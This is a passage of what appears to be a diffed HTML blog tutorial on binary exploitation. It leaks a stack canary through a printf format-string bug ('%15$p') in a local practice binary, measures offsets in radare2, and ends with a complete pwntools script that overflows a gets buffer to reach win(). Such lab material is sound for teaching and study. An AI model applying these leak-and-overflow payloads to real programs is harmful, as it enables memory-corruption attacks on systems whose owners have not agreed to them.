+</code></pre><p>But supposing we have 3 format identifiers with only a single argument.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ee82ee">int</span> a = <span style="color:#f60">64</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff0">printf</span>(<span style="color:#87ceeb">&#34;%x %x %x&#34;</span>, a);
+</span></span></code></pre></div><p>And we get:</p>
+<pre tabindex="0"><code>40 3c27ed48 61879738
+</code></pre><p>Not meet the expected amount of arguments, <code>printf</code> simply continues printing the next values on the stack, <em>thus leaking</em> them. Hence, the latter two, <code>3c27ed48</code> and <code>61879738</code>, are probably not our <code>int a = 64</code> but <em>random</em> junk value on the stack.</p>
+<p>Let us have a glance at the vulnerable source again.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ff0">vuln</span>():
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>	<span style="color:#ff0">puts</span>(<span style="color:#87ceeb">&#34;Leak me&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff0">gets</span>(buffer);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff0">printf</span>(buffer);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff0">puts</span>(<span style="color:#87ceeb">&#34;&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff0">puts</span>(<span style="color:#87ceeb">&#34;Overflow me&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff0">gets</span>(buffer);
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>The <code>puts</code> function allows us to leak the canary, we then can use that value to overwrite the canary itself and finally call <code>win()</code> to achieve the initial goal.</p>
+<p>Now to the most intriguing phase, let us load it in radare2 and in most practical cases, you should first check the protection properties of the binary. It either could be done using <a href="https://github.com/slimm609/checksec.sh">checksec</a> or <a href="https://r2wiki.readthedocs.io/en/latest/tools/rabin2/">rabin2</a>, whatever comes to your liking.</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-16_12-49.png"></p>
+<p>Next, we want to set a breakpoint at the subsequent instruction near the first <code>gets</code> and a second breakpoint around the canary so that we can easily determine our canary offset.</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-16_13-12.png"></p>
+<p>Executing the program and hit the first breakpoint at <code>0x00401163</code>, we are therefrom able to read the canary value. Furthermore, we can calculate the padding length between our buffer and the canary by evaluating <code>0x50 - 0x8 = 0x48 = 72 (decimal)</code>.</p>
+<pre tabindex="0"><code>[0x7f347597b050]&gt; s sym.vuln;pdf
+
+┌ 133: sym.vuln ();
+│           ; var int64_t var_50h @ rbp-0x50	; our 32-byte buffer
+│           ; var int64_t var_8h @ rbp-0x8		; canary variable
+...
+│           0x0040115a      64488b042528.  mov rax, qword fs:[0x28]	; stored canary in RAX
+│           0x00401163 b    488945f8       mov qword [var_8h], rax	; Breakpoint 1
+...
+
+[0x00401163]&gt; dr rax
+0xdc9e3a07a36a200
+[0x00401163]&gt;
+</code></pre><p>Our current canary value: <code>0xdc9e3a07a36a200</code></p>
+<p>Then, we need to know how far is it from our buffer offset to the canary&rsquo;s and in order to do so, let us hit the second breakpoint and read the stack.</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-16_14-20.png"></p>
+<p>So the buffer is 15 addresses (or 64 bytes) from the canary, that is also the reason why <code>%15$p</code> is our input so that <code>puts</code> can print out the special sentinel value.</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-16_14-26.png"></p>
+<p>And we successfully get the correct value of the canary.</p>
+<p>Nevertheless, keep in mind that stack canaries are randomized for every new process, so we have to automate the canary leaking procedure as below:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#0f0">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#f00">from</span> pwn <span style="color:#f00">import</span> *
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r = process(<span style="color:#87ceeb">&#39;./canary&#39;</span>)
+</span></span><span style="display:flex;"><span>r.sendlineafter(<span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#39;Leak me</span><span style="color:#87ceeb">\n</span><span style="color:#87ceeb">&#39;</span>, <span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#39;%15$p&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>canary = int(r.recvline(), <span style="color:#f60">16</span>)
+</span></span><span style="display:flex;"><span>log.info(<span style="color:#87ceeb">&#39;Canary: </span><span style="color:#87ceeb">%s</span><span style="color:#87ceeb">&#39;</span> % hex(canary))
+</span></span></code></pre></div><p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-16_14-45.png"></p>
+<p>And thus far we have had our skeleton payload:</p>
+<pre tabindex="0"><code>payload = PAD_TILL_CANARY (72) + CANARY + PAD_TIL_RIP (??) + WIN_OFFSET (??)
+</code></pre><p>In order to calculate <code>PAD_TIL_RIP</code>, let us get back to radare2 and set another breakpoint after the second <code>gets</code>.</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-16_15-33.png"></p>
+<p>Stop at the second breakpoint we have set at the beginning, here I want you to remember that our current canary offset is at <code>0x7fffb74f25c0+16 = 0x7fffb74f25d0</code>.</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-16_15-36.png"></p>
+<p>Follow the execution flow, we now hit the third breakpoint after <code>gets</code> then we examine the data chunk at <code>0x7fffb74f25d0</code>.</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-16_15-44.png"></p>
+<p>Using <a href="https://r2wiki.readthedocs.io/en/latest/tools/ragg2/">ragg2</a> pattern, we now know the RIP offset is 16 bytes from the canary&rsquo;s start point, and the canary size is 8 (or 4 in 32-bit) bytes so our <code>PAD_TIL_RIP</code> is <code>16 - 8 = 8</code>.</p>
+<p>And the last factor is <code>WIN_OFFSET</code>, you can dump it out either using objdump</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-16_15-56.png"></p>
+<p>or <code>afl~win</code> within radare2.</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-16_15-57.png"></p>
+<h3 id="solvepy-3"><a class="h-anchor" href="#solvepy-3">Solve.py</a></h3>
+<p>You finally made it here, congratulation.</p>
+<pre tabindex="0"><code>payload = PAD_TILL_CANARY (72) + CANARY + PAD_TIL_RIP (8) + WIN_OFFSET (0x004011ec)
+</code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#0f0">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#f00">from</span> pwn <span style="color:#f00">import</span> *
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r = process(<span style="color:#87ceeb">&#39;./canary&#39;</span>)
+</span></span><span style="display:flex;"><span>r.sendlineafter(<span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#39;Leak me</span><span style="color:#87ceeb">\n</span><span style="color:#87ceeb">&#39;</span>, <span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#39;%15$p&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>canary = int(r.recvline(), <span style="color:#f60">16</span>)
+</span></span><span style="display:flex;"><span>log.info(<span style="color:#87ceeb">&#39;Canary: </span><span style="color:#87ceeb">%s</span><span style="color:#87ceeb">&#39;</span> % hex(canary))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload = asm(shellcraft.nop()) * <span style="color:#f60">72</span>	<span style="color:#0f0"># PAD_TIL_CANARY</span>
+</span></span><span style="display:flex;"><span>payload += p64(canary)					<span style="color:#0f0"># CANARY</span>
+</span></span><span style="display:flex;"><span>payload += asm(shellcraft.nop()) * <span style="color:#f60">8</span>	<span style="color:#0f0"># PAD_TIL_RIP</span>
+</span></span><span style="display:flex;"><span>payload += p64(<span style="color:#f60">0x004011ec</span>)				<span style="color:#0f0"># WIN_OFFSET</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r.sendlineafter(<span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#39;Overflow me</span><span style="color:#87ceeb">\n</span><span style="color:#87ceeb">&#39;</span>, payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(r.clean())
+</span></span></code></pre></div><p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-16_16-01.png"></p>
+
+</article>
+
+            </div>
+        </main>
+    </body></html>
